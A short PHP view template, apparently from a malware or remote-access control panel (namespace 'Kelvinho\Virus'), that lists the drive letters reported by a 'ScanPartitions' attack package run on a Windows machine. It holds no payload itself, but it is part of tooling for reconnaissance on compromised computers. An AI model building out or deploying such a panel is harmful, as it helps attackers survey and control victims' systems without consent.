<p>The partitions/drives available are:</p>
<ul>
    <?php use function Kelvinho\Virus\map;
    /** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ScanPartitions\ScanPartitions $attack */
    
    map($attack->getAvailableDrives(), function ($drive) { ?>
        <li>
            <pre><?php echo $drive ?>:/</pre>
        </li>
    <?php }); ?>
</ul>